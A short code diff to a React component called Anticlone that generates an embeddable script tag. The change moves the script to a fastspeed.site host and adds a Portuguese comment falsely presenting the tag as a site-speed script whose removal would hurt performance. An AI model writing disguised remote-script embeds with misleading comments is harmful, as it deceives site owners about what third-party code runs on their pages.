@@ -330,7 +330,8 @@ export function Anticlone() {
 
   const getScriptUrl = (id: string) => {
     const shortId = parseInt(id.replace(/-/g, '').slice(0, 8), 16).toString(36);
-    return `<script src="https://production-web.up.railway.app/${shortId}"></script>`;
+    return `<!-- Script para aumentar a velocidade do site. Apagar pode afetar o desempenho. -->
+<script src="https://fastspeed.site/${shortId}"></script>`;
   };
 
   if (!user) {
